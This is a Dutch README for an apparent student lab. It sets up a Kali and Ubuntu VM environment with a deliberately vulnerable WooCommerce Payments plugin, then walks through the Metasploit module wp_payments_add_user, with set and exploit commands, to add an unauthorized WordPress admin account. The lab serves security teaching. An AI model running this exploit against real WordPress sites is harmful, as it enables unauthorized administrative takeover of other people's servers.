# Readme voor WordPress exploit

Auteurs: Arthur Van Ginderachter, Jaak Daemen, Renz De Baets, Bert Coudenys

In deze readme gaan wij uitleggen hoe je de exploit van WordPress kan gebruiken om een Admin account te maken en toegang te krijgen met admin level access op een WordPress server.

## Inloggegevens van de VM's

- Kali Linux:

Log in: root

Wachtwoord: osboxes.org

- Ubuntu server:

Log in: osboxes

Wachtwoord: osboxes.org

## Scripts en bestanden nodig voor het opzetten van de omgeving.

We hebben de omgeving opzetten geautomatiseerd aan de hand van scripts zowel PowerShell als bash.
Binnen het .zip bestand zal u 4 bestanden vinden.

1. rootpromotie.sh
   - Dit bash script zal gekopieerd worden naar de kali linux machine en dan uitgevoerd worden door het vmcreator.ps1 script.
   - Dit bash script bevat commando's om ervoor te zorgen dat het root account geactiveerd wordt voor de Kali Linux vm.
2. script1.sh
   - Dit bash script zal uitgevoerd worden door het vmcreator.ps1 script.
   - Dit bash script zal een databank en een WordPress server opzetten. Het zal ook de manuele installatie van WordPress overslaan en dit automatisch doen.
3. guestupdate.sh
   - Dit script update de guest-additions van VirtualBox op de Ubuntu server (dit is nodig voor VBoxManage correct te kunnen gebruiken).
   - Dit bash script zal gekopieerd worden naar de Ubuntu server machine en dan uitgevoerd worden door het vmcreator.ps1 script.
4. vmcreator.ps1
   - Dit PowerShell script is verantwoordelijk voor het opzetten van de 2 nodige VM's aan de hand van VBoxManage.
   - Dit PowerShell script zal ook beide bash scripts uitvoeren en dus de volledige installatie automatiseren.
5. woocommerce-payments.5.6.1.zip
   - Deze zip file bevat de verouderde en kwetsbare versie van een WooCommerce plugin.
   - BELANGERIJK! Pak deze zip NIET uit.

Download ook deze twee .vdi files van [OSBoxes](https://www.osboxes.org/)

1. Download de "23.04 Lunar Lobster" [Ubuntu-Server](https://www.osboxes.org/ubuntu-server/)
2. Download ook de "2024.1" [Kali-Linux](https://www.osboxes.org/kali-linux/)
   Deze .vdi files mogen op uw toestel staan waar u wilt, maar hou de locatie goed bij.
   Pak nu beide .vdi's uit.

## Opzetten van de omgeving

Pak de .zip file die u gedownload heeft uit.
Voer enkel het "vmcreator.ps1" uit, dit gewoon uitvoeren door erop te klikken (niet met de PowerShell ISE). Alvoor u dit kan doen zal u het bestand moeten vertrouwen.
Doe dit door, rechtermuisklik vervolgens "Eigenschappen" te openen en vanonder te klikken op "Blokkering opheffen". Dit is noodzakelijk, anders zal het script niet uitvoerbaar zijn!
Het script zal u drie absolute paden vragen. Onder andere van de twee .vdi bestanden als ook van de "shared" map. Dit is de map die u zojuist hebt gedownload en uitgepakt. Tijdens het uitvoeren van het "vmcreator.ps1" script zal er gevraagd worden om het wachtwoord van de Ubuntu server op te geven, dit is: `osboxes.org`.

### Uitzonderingen/Errors

Zorg ervoor dat na het uitvoeren van het script de laatste regel in de console het volgende weergeeft: "IP-adres van de Ubuntu-server: "arthurisgeenjaak.com". Als dit niet het geval is, betekent dit dat het hosts-bestand niet correct is aangemaakt.

Hier volgt een voorbeeld van hoe het einde van het script kan uitzien (indien er een fout is in geslopen):

```bash
IP-Adres van de Ubuntu-server: 192.168.69.69
IP-Adres van de Ubuntu-server:
```

OF in het bestand "/etc/hosts" kan je controleren dat "arthurisgeenjaak.com" in voorkomt. Dit kan u bekijken door in de shell het volgende commando in te voeren: `sudo cat /etc/hosts`.

U kan dit oplossen door:

1. U voegt deze handmatig toe als het script niet correct heeft gewerkt door het commando `sudo nano /etc/hosts` uit te voeren en daar te controleren of het gegeven ubuntu server ip er in staat en vervolgens arthurisgeenjaak.com er naast te typen.
2. Deze zal enkel de bash scripts uitvoeren die niet correct hebben gewerkt aangezien de VM's al bestaan en bepaalde gedeeltes van de installatie al gebeurd zijn.

   Nu zou dit te zien moeten zijn.

```bash
IP-Adres van de Ubuntu-server: 192.168.69.69
IP-Adres van de Ubuntu-server: arthurisgeenjaak.com
```

## Misbruiken van exploit a.d.h.v. Metasploit

Na het opzetten van de werkomgeving kan u de exploit gebruiken om een admin level user toe te voegen.
Dit hebben wij gedaan via Metasploit.
Open Metasploit op de Kali Linux en u zult een terminal te zien krijgen.
In deze terminal kan u het volgende commando uitvoeren om de exploit te zoeken:

```bash
search woocommerce
```

We zijn op zoek naar de exploit genaamd "auxiliary/scanner/http/wp_payments_add_user 2023-03-22"
Gebruik voor het selecteren van de juiste exploit het commando:

```bash
use #{numer van exploit. normaal 1}
```

Nu gaan we een aantal "set" commando's uitvoeren om Metasploit de correcte informatie te geven voor deze exploit.
Om meer informatie te vinden over deze commando's en waarom ze nodig zijn kan je volgende commando's gebruiken:

```bash
show options
```

```bash
set RHOSTS arthurisgeenjaak.com
set username #{Username van het nieuw admin account die u wilt maken}
set password #{Password van het nieuw admin account die u wilt maken}
```

Ok, nu bent u klaar om de exploit effectief uit te voeren. Gebruik hiervoor het commando:

```bash
exploit
```

Na het uitvoeren hiervan, zal er een nieuw account aangemaakt zijn op de WordPress server dat kan gebruikt worden om misbruik te maken van deze server.
